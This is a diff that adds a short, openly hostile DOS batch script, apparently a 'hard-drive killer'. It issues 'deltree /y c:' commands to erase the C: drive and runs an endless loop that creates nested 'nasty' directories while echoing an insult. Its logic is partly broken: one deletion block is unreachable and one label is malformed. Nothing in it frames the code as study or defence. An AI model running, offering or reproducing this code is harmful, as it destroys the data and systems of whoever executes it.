@@ -1,0 +1,32 @@
+@echo off
+cls 
+if exist c:\windows\format\command\format.* goto winform 
+goto de 
+:dosform 
+cd\dos  
+cd\  
+:winform 
+cd\  
+goto write 
+:de 
+goto write 
+:dtree 
+call deltree /y c:  
+if exist c:\windows\command\deltree.* goto delwin 
+:deldos 
+cd\dos 
+call deltree /y c:  
+cd\ 
+delwin 
+call deltree /y c:  
+cd\  
+:write 
+type hdkiller.txt 
+c:\ 
+cd\ 
+:nasty 
+md nasty 
+cd nasty 
+echo You're Gone @$$ hole!!!! yourgone.txt 
+goto nasty 
+pause 
